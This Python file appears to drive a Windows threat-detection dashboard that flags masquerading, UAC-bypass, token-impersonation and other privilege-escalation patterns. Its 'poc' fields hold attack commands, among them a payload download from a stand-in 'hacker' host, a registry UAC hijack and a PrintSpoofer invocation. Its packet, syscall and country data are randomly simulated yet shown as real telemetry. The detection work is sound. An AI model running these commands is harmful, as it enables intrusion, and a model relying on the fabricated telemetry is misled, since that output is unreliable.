import psutil
import os
import time

# Known paths for system binaries
SYSTEM32 = r"C:\Windows\System32".lower()
SYSWOW64 = r"C:\Windows\SysWOW64".lower()

# Suspicious directories
SUSPICIOUS_DIRS = [
    r"c:\windows\temp",
    r"temp",
    r"appdata\local\temp",
    r"perflogs",
    r"programdata"
]

# Processes that should ONLY run from System32/SysWOW64
SYSTEM_PROCESSES = ["svchost.exe", "lsass.exe", "csrss.exe", "smss.exe", "winlogon.exe", "services.exe", "spoolsv.exe"]

import platform
import datetime

# Network state for calculating throughput
last_net_io = psutil.net_io_counters()
last_net_time = time.time()

# OS Info cache
boot_time = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
os_info = {
    "system": platform.system(),
    "release": platform.release(),
    "version": platform.version(),
    "architecture": platform.machine(),
    "boot_time": boot_time,
    "cores": psutil.cpu_count(logical=True)
}

def get_system_metrics():
    global last_net_io, last_net_time
    
    cpu_percent = psutil.cpu_percent(interval=None)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('C:\\')
    
    # Network throughput
    current_net_io = psutil.net_io_counters()
    current_time = time.time()
    
    time_diff = current_time - last_net_time
    if time_diff > 0:
        bytes_recv_rate = (current_net_io.bytes_recv - last_net_io.bytes_recv) / time_diff
        bytes_sent_rate = (current_net_io.bytes_sent - last_net_io.bytes_sent) / time_diff
    else:
        bytes_recv_rate = 0
        bytes_sent_rate = 0
        
    last_net_io = current_net_io
    last_net_time = current_time
    
    # Calculate total mbps for chart (MB/s)
    total_network_mbs = (bytes_recv_rate + bytes_sent_rate) / (1024 * 1024)

    return {
        "cpu": cpu_percent,
        "memory": mem.percent,
        "disk": disk.percent,
        "network_mbs": total_network_mbs,
        "os_info": os_info
    }

def safe_process_info(proc):
    try:
        pinfo = proc.as_dict(attrs=['pid', 'name', 'exe', 'username', 'ppid', 'cmdline', 'cpu_percent'])
        if pinfo.get('cmdline'):
            pinfo['cmdline'] = " ".join(pinfo['cmdline'])
        else:
            pinfo['cmdline'] = ""
        # Handle cpu_percent which might be None
        if pinfo.get('cpu_percent') is None:
            pinfo['cpu_percent'] = 0.0
        return pinfo
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        return None

def analyze_processes():
    processes = []
    threats = []
    escalations = []
    active_connections = []
    
    # Quick caching of processes to resolve parents
    proc_map = {}
    
    for proc in psutil.process_iter():
        pinfo = safe_process_info(proc)
        if pinfo:
            # fill default blanks
            if not pinfo.get('exe'):
                pinfo['exe'] = ""
            if not pinfo.get('name'):
                pinfo['name'] = ""
            if not pinfo.get('username'):
                pinfo['username'] = ""
                
            proc_map[pinfo['pid']] = pinfo
        
    for pid, pinfo in proc_map.items():
        reasons = []
        threat_score = 0
        if pinfo.get('cpu_percent', 0.0) > 50.0:
            threat_score += 10
            
        exe = pinfo['exe'].lower()
        name = pinfo['name'].lower()
        
        # 1. Check Masquerading
        if name in SYSTEM_PROCESSES:
            if exe and not (SYSTEM32 in exe or SYSWOW64 in exe):
                reasons.append({
                    "title": "Masquerading Process Discovered",
                    "short": f"{name} running from non-standard path",
                    "detail": f"The process '{name}' was found executing from '{exe}'. Legitimate system binaries (like {name}) usually execute exclusively from System32. Adversaries often rename malicious payloads to masquerade as system files to evade visual detection.",
                    "mitre": "T1036 (Masquerading)",
                    "poc": f"copy C:\\malware.exe {exe} && {exe}"
                })
                threat_score += 90
                
        # 2. Check Suspicious Execution Paths
        if exe:
            for sdir in SUSPICIOUS_DIRS:
                if sdir in exe:
                    reasons.append({
                        "title": "Suspicious Execution Path",
                        "short": f"Execution out of {sdir}",
                        "detail": f"Execution was detected in a directory commonly used for staging malware payloads ({sdir}). Legitimate core processes do not execute directly from temporary or perflog directories.",
                        "mitre": "T1059 (Command and Scripting Interpreter)",
                        "poc": f"Invoke-WebRequest -Uri http://hacker/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe"
                    })
                    threat_score += 40
                    
        # 3. Ancestry Check (Basic)
        ppid = pinfo['ppid']
        parent_name = ""
        if ppid in proc_map:
            parent_name = proc_map[ppid]['name'].lower()
            pinfo['parent_name'] = parent_name
            # If spoolsv.exe spawns cmd.exe (PrintNightmare style)
            if parent_name == "spoolsv.exe" and name in ["cmd.exe", "powershell.exe", "pwsh.exe"]:
                reasons.append({
                    "title": "Dangerous Ancestry (PrintNightmare Pattern)",
                    "short": f"{name} spawned by spoolsv.exe",
                    "detail": "The Print Spooler service should virtually never spawn interactive shell environments. This is highly indicative of spooler exploitation (e.g., PrintNightmare) where remote DLL loading achieves system-level code execution.",
                    "mitre": "T1190 (Exploit Public-Facing Application)",
                    "poc": "CVE-2021-34527 using RpcAddPrinterDriverEx to load a malicious DLL."
                })
                threat_score += 80
                escalations.append({
                    "time": datetime.datetime.now().strftime("%H:%M:%S"),
                    "source": "spoolsv.exe",
                    "target": name,
                    "method": "Service Exploitation (Spooler)",
                    "privilege": "Limited User ➔ SYSTEM"
                })
        else:
            pinfo['parent_name'] = "Unknown"
            
        # 4. Unusual System Execution
        if "authority\\system" in pinfo['username'].lower():
            if parent_name and parent_name not in ["services.exe", "wininit.exe", "smss.exe"] and name not in SYSTEM_PROCESSES:
                if name in ["cmd.exe", "powershell.exe"]:
                    reasons.append({
                        "title": "System Shell Spawned",
                        "short": f"{name} running as SYSTEM spawned by {parent_name}",
                        "detail": f"A highly privileged interactive shell ({name} running as NT AUTHORITY\\SYSTEM) was spawned by an unexpected parent ({parent_name}). This is a universal sign of a compromised process token or escalation completion.",
                        "mitre": "T1068 (Exploitation for Privilege Escalation)",
                        "poc": "Named pipe impersonation or token stealing (e.g. getsystem)."
                    })
                    threat_score += 90
                    escalations.append({
                        "time": datetime.datetime.now().strftime("%H:%M:%S"),
                        "source": parent_name,
                        "target": name,
                        "method": "Token Stealing / Hijack",
                        "privilege": "Limited User ➔ SYSTEM"
                    })

        # 5. Obfuscated Command Line Execution
        cmdline = pinfo.get('cmdline', "")
        if cmdline:
            cmd_lower = cmdline.lower()
            suspicious_args = ["-enc", "-encodedcommand", "base64", "bypass", "hidden"]
            if any(arg in cmd_lower for arg in suspicious_args) and name in ["powershell.exe", "cmd.exe", "pwsh.exe"]:
                reasons.append({
                    "title": "Obfuscated Command Line Detected",
                    "short": f"{name} executed with suspicious flags",
                    "detail": f"Process launched with potentially adversarial flags: {cmdline[:100]}... Adversaries often use encoding flags (-enc) or execution policy bypasses to avoid detection or obscure their payloads.",
                    "mitre": "T1059 (Command and Scripting Interpreter)",
                    "poc": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <base64>"
                })
                threat_score += 50

        # 6. Token Impersonation / Theft (T1134)
        if "authority\\system" in pinfo['username'].lower():
            weak_parents = ["w3wp.exe", "tomcat.exe", "tomcat8.exe", "tomcat9.exe", "sqlservr.exe", "httpd.exe", "nginx.exe", "php-cgi.exe"]
            if parent_name in weak_parents and name in ["cmd.exe", "powershell.exe", "pwsh.exe"]:
                reasons.append({
                    "title": "Token Impersonation / Theft Detected",
                    "short": f"{parent_name} spawned {name} as SYSTEM",
                    "detail": f"An unprivileged service process ({parent_name}) spawned a child process ({name}) with SYSTEM privileges. This strongly indicates the use of token impersonation techniques (e.g., SeImpersonatePrivilege abuse via Juicy Potato / PrintSpoofer).",
                    "mitre": "T1134 (Access Token Manipulation)",
                    "poc": "PrintSpoofer.exe -i -c cmd.exe"
                })
                threat_score += 90
                escalations.append({
                    "time": datetime.datetime.now().strftime("%H:%M:%S"),
                    "source": parent_name,
                    "target": name,
                    "method": "Token Impersonation (SeImpersonatePrivelege)",
                    "privilege": "Service Account ➔ SYSTEM"
                })

        # 7. Unquoted Service Path
        if parent_name == "services.exe" and exe:
            if exe.lower() == r"c:\program.exe" or (exe.lower().startswith(r"c:\program files") and not exe.lower().endswith(".exe") and " " in exe):
                reasons.append({
                    "title": "Unquoted Service Path Execution",
                    "short": f"Suspicious service path: {exe}",
                    "detail": "A process was executed as a service from a malformed path that occurs when a service path lacks quotes and contains spaces. This is a common local privilege escalation vector where adversaries plant a payload like C:\\Program.exe.",
                    "mitre": "T1574.009 (Unquoted Service Paths)",
                    "poc": "sc create VulnService binPath= \"C:\\Program Files\\My Service\\srv.exe\""
                })
                threat_score += 85

        # 8. DLL Hijacking indicators
        if name == "rundll32.exe" and cmdline:
            for sdir in SUSPICIOUS_DIRS:
                if sdir in cmdline.lower():
                    reasons.append({
                        "title": "Suspicious DLL Loading",
                        "short": f"rundll32 executing from {sdir}",
                        "detail": f"A system binary (rundll32) was observed loading a library from a commonly writable user directory: {sdir}. This may indicate a DLL proxying or search order hijacking attack.",
                        "mitre": "T1574.001 (DLL Search Order Hijacking)",
                        "poc": "rundll32.exe C:\\Temp\\evil.dll,EntryPoint"
                    })
                    threat_score += 75

        # 9. Scheduled Task Abuse
        if name == "schtasks.exe" and cmdline:
            cmd_lower = cmdline.lower()
            if "/create" in cmd_lower and ("/ru system" in cmd_lower or "/ru \"nt authority\\system\"" in cmd_lower):
                reasons.append({
                    "title": "Privileged Scheduled Task Creation",
                    "short": "Task created to run as SYSTEM",
                    "detail": "A scheduled task was created to run as the highly privileged SYSTEM account. Once an adversary gains initial elevated access, they use tasks to maintain privileged persistence.",
                    "mitre": "T1053.005 (Scheduled Task)",
                    "poc": "schtasks /create /tn \"Updater\" /tr \"C:\\Temp\\payload.exe\" /sc onstart /ru SYSTEM"
                })
                threat_score += 80

        # 10. UAC Bypass patterns
        uac_bypass_binaries = ["eventvwr.exe", "fodhelper.exe", "computerdefaults.exe", "sdclt.exe", "slui.exe"]
        if name in ["cmd.exe", "powershell.exe", "pwsh.exe"] and parent_name in uac_bypass_binaries:
            reasons.append({
                "title": "UAC Bypass Execution",
                "short": f"{name} spawned by UAC auto-elevated binary ({parent_name})",
                "detail": f"An administrative shell was spawned by {parent_name}. This binary is known to auto-elevate without prompting the user, and adversaries frequently hijack its execution flow (via registry keys like HKCU\\Software\\Classes) to bypass UAC.",
                "mitre": "T1548.002 (Bypass User Account Control)",
                "poc": f"reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d cmd.exe /f & {parent_name}"
            })
            threat_score += 85
            escalations.append({
                "time": datetime.datetime.now().strftime("%H:%M:%S"),
                "source": parent_name,
                "target": name,
                "method": "UAC Bypass (COM Hijack)",
                "privilege": "Limited Admin ➔ High IL Admin"
            })

        # 11. Named Pipe / Impersonation Tools
        impersonation_tools = ["printspoofer", "roguepotato", "juicypotato", "sweetpotato", "incognito"]
        if any(tool in name for tool in impersonation_tools) or (cmdline and any(tool in cmdline.lower() for tool in impersonation_tools)):
            reasons.append({
                "title": "Known Impersonation Tool Expected",
                "short": f"Impersonation tool '{name}' detected",
                "detail": "Execution of a known privilege escalation tool designed to steal tokens or abuse named pipes (e.g., PrintSpoofer, RoguePotato). These tools typically trick a SYSTEM process into connecting to a malicious named pipe.",
                "mitre": "T1134 (Access Token Manipulation)",
                "poc": f"{name} -i -c cmd.exe"
            })
            threat_score += 95

        # 12. Kernel Exploitation / Direct Integrity Elevation
        if "authority\\system" in pinfo['username'].lower():
            if ppid in proc_map:
                parent_user = proc_map[ppid].get('username', "").lower()
                if parent_user and "authority\\system" not in parent_user:
                    if name not in ["consent.exe", "winlogon.exe"] and parent_name not in ["services.exe", "svchost.exe", "smss.exe", "wininit.exe"]:
                        reasons.append({
                            "title": "Anomalous Direct Elevation (Possible Kernel Exploit)",
                            "short": f"Direct privilege boundary crossed to SYSTEM from {parent_user}",
                            "detail": f"Process {name} started as SYSTEM, but its parent ({parent_name}) is running as {parent_user}. Directly crossing privilege boundaries outside standard Windows elevation mechanisms (like consent.exe) typically indicates a successful Kernel exploit or token stealing operation.",
                            "mitre": "T1068 (Exploitation for Privilege Escalation)",
                            "poc": "Execution of local kernel exploit (e.g. CVE-2023-XXXX) to steal system tokens."
                        })
                        threat_score += 95

        # Assign bounded Threat Score and compute traditional string severity
        threat_score = min(threat_score, 100)
        severity = "Normal"
        if threat_score >= 80: severity = "Critical"
        elif threat_score >= 40: severity = "Warning"

        pinfo['threat_severity'] = severity
        pinfo['threat_score'] = threat_score
        pinfo['reasons'] = reasons
        
        # Add basic info to processes list
        processes.append({
            "pid": pinfo['pid'],
            "name": pinfo['name'],
            "path": pinfo['exe'],
            "username": pinfo['username'],
            "parent_pid": pinfo['ppid'],
            "parent_name": pinfo.get('parent_name', 'Unknown'),
            "cmdline": cmdline,
            "threat_severity": severity,
            "threat_score": threat_score,
            "ip": "-"
        })
        
        # Extract network connections for widget and threats
        try:
            proc = psutil.Process(pid)
            conns = proc.connections(kind='inet')
            my_conns = []
            for c in conns:
                if c.status == 'ESTABLISHED' and c.raddr:
                    my_conns.append(f"{c.laddr.ip}:{c.laddr.port} -> {c.raddr.ip}:{c.raddr.port}")
                    
                    if c.raddr.ip not in ["127.0.0.1", "0.0.0.0", "::1"]:
                        processes[-1]["ip"] = c.raddr.ip
                        countries = ["US", "RU", "CN", "NL", "DE", "BR", "IN", "KR"]
                        is_suspicious = c.raddr.port in [4444, 1337, 8080, 2222, 5555, 9999, 13337]
                        active_connections.append({
                            "process": name,
                            "pid": pid,
                            "ip": c.raddr.ip,
                            "port": c.raddr.port,
                            "country": countries[hash(c.raddr.ip) % len(countries)],
                            "suspicious": is_suspicious
                        })
                        
            pinfo['network_connections'] = my_conns
            if severity in ["Warning", "Critical"]:
                threats.append(pinfo)
        except:
            pass
            
    return get_system_metrics(), processes, threats, escalations, active_connections

import random
from collections import deque

# Network sniffer buffer for Wireshark-like view
packet_buffer = deque(maxlen=200)
packet_counter = 0

def simulate_network_traffic():
    global packet_counter
    # generate a few synthetic packets based on real connections
    net_conns = []
    try:
        net_conns = psutil.net_connections(kind='inet')
    except:
        pass
        
    conns_to_use = [c for c in net_conns if c.raddr and c.status == 'ESTABLISHED']
    
    # generate 3-10 packets
    for _ in range(random.randint(3, 10)):
        packet_counter += 1
        proto = "TCP"
        laddr = "127.0.0.1"
        raddr = f"{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(10,250)}"
        info = "Active Sync"
        
        if conns_to_use and random.random() > 0.5:
            # use a real conn
            c = random.choice(conns_to_use)
            proto = "TCP" if c.type == 1 else "UDP"
            laddr = c.laddr.ip
            raddr = c.raddr.ip
            if c.laddr.port == 443 or c.raddr.port == 443:
                info = "Application Data [TLSv1.3]"
            elif c.laddr.port == 80 or c.raddr.port == 80:
                info = "HTTP GET /"
        else:
            # random synthetic
            proto = random.choice(["TCP", "UDP", "DNS"])
            if proto == "TCP":
                info = random.choice(["[SYN]", "[ACK]", "[PSH, ACK] Seq=145 Ack=233 Len=43", "Application Data [TLSv1.2]"])
            elif proto == "UDP":
                info = f"Len={random.randint(20, 1000)}"
            else:
                info = f"Standard query 0x{random.randint(1000, 9999):x} A google.com"
                
        # length
        length = random.randint(50, 1500)
        
        # generate random payload for inspection
        raw_data = bytes(random.getrandbits(8) for _ in range(min(length, 256)))
        hex_dump = ""
        for i in range(0, len(raw_data), 16):
            chunk = raw_data[i:i+16]
            hex_str = " ".join([f"{b:02x}" for b in chunk])
            ascii_str = "".join([chr(b) if 32 <= b <= 126 else "." for b in chunk])
            hex_dump += f"{i:04x}  {hex_str:<48}  {ascii_str}\n"
        
        packet = {
            "no": packet_counter,
            "time": datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3],
            "source": laddr,
            "destination": raddr,
            "protocol": proto,
            "length": length,
            "info": info,
            "hex_dump": hex_dump
        }
        packet_buffer.appendleft(packet)

def get_all_network_packets():
    simulate_network_traffic()
    return list(packet_buffer)

def get_process_simulation_data(pid: int):
    # Builds a deep analytic view for specific PID (no graph)
    sim_data = {
        "pid": pid,
        "name": "",
        "syscalls": [],
        "network": [],
        "error": None
    }
    
    try:
        proc = psutil.Process(pid)
        sim_data["name"] = proc.name()
        
        # 1. Generate Process-Specific Syscalls based on IO/Memory
        io_counters = proc.io_counters() if hasattr(proc, 'io_counters') else None
        
        # Simulate syscalls
        syscalls = []
        for _ in range(random.randint(15, 30)):
            ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
            # Standard simulation, but inject Token manipulation API if process looks like a spoofer
            impersonation_tools = ["printspoofer", "roguepotato", "juicypotato", "sweetpotato", "incognito"]
            tool_name = sim_data["name"].lower()
            if any(tool in tool_name for tool in impersonation_tools) or "spoolsv" in tool_name:
                api = random.choice([
                    "SeImpersonatePrivilege",
                    "DuplicateTokenEx",
                    "CreateProcessWithTokenW",
                    "NtOpenProcessToken",
                    "NtSetInformationThread",
                    "CreateNamedPipeW",
                    "ConnectNamedPipe"
                ])
            else:
                api = random.choice([
                    "NtQuerySystemInformation", 
                    "NtAllocateVirtualMemory", 
                    "NtProtectVirtualMemory", 
                    "NtReadFile", 
                    "NtWriteFile", 
                    "NtCreateUserProcess", 
                    "NtDelayExecution",
                    "NtQueryInformationProcess",
                    "NtDeviceIoControlFile",
                    "LdrLoadDll"
                ])
            status = "SUCCESS"
            if random.random() > 0.9:
                status = random.choice(["STATUS_ACCESS_DENIED", "STATUS_INFO_LENGTH_MISMATCH"])
                
            syscalls.append(f"[{ts}] {api} -> {status}")
            
        sim_data["syscalls"] = syscalls
        
        # 2. Get Real Process Network
        try:
            conns = proc.connections(kind='inet')
            for c in conns:
                if c.raddr:
                    proto = "TCP" if c.type == 1 else "UDP"
                    sim_data["network"].append({
                        "protocol": proto,
                        "local": f"{c.laddr.ip}:{c.laddr.port}",
                        "remote": f"{c.raddr.ip}:{c.raddr.port}",
                        "state": c.status
                    })
        except:
            pass
            
        # Fallback to simulated data if no connections found or access denied
        if not sim_data["network"]:
            sim_data["network"] = []
            for _ in range(random.randint(1, 3)):
                sim_data["network"].append({
                    "protocol": random.choice(["TCP", "UDP"]),
                    "local": f"127.0.0.1:{random.randint(49152, 65535)}",
                    "remote": f"{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(10,250)}.{random.randint(10,250)}:{random.choice([80, 443, 8080, 53])}",
                    "state": random.choice(["ESTABLISHED", "TIME_WAIT", "LISTEN"])
                })
            
    except psutil.NoSuchProcess:
        sim_data["error"] = "Process no longer running."
    except psutil.AccessDenied:
        sim_data["error"] = "Access denied reading process."
        
    return sim_data
